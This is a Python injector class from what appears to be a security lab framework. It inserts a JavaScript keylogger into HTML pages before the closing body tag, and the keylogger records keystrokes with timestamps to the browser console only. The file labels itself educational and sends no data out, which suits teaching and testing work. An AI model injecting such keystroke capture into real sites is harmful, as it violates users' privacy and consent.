"""
Keylogger demo injector.

This injector generates a benign keylogger demonstration for lab purposes.
It logs keystrokes to console only - no data exfiltration.
"""

from typing import Optional

from .base import BaseInjector


class KeyloggerDemoInjector(BaseInjector):
    """
    Injector that generates a benign keylogger demo.

    This is a LAB-ONLY demonstration that logs keystrokes to the browser console.
    It does NOT exfiltrate data and is for educational purposes only.
    """

    def __init__(self, config: Optional[dict] = None):
        """
        Initialize the keylogger demo injector.

        Args:
            config: Optional configuration dict
        """
        super().__init__(config)
        self.max_log_entries = self.config.get("max_log_entries", 50)

    def get_payload(self) -> str:
        """
        Generate the keylogger demo script.

        Returns:
            Script tag with benign keylogger demo (console logging only)
        """
        script = f"""
<script>
(function() {{
    // LAB DEMO: Keylogger that logs to console only
    // NO data exfiltration - for educational purposes only
    let keyLog = [];
    const MAX_ENTRIES = {self.max_log_entries};

    document.addEventListener('keydown', function(e) {{
        const entry = {{
            key: e.key,
            timestamp: new Date().toISOString(),
            target: e.target.tagName || 'unknown'
        }};

        keyLog.push(entry);

        // Keep only recent entries
        if (keyLog.length > MAX_ENTRIES) {{
            keyLog.shift();
        }}

        console.log('[Keylogger Demo] Keystroke logged:', entry);
        console.log('[Keylogger Demo] Total logged:', keyLog.length);
    }});

    console.log('[Keylogger Demo] Initialized - Logging to console only');
}})();
</script>"""
        return script.strip()

    def should_inject(self, html_content: str) -> bool:
        """
        Check if injection should occur.

        Args:
            html_content: HTML content to check

        Returns:
            True if </body> tag is present
        """
        return "</body>" in html_content
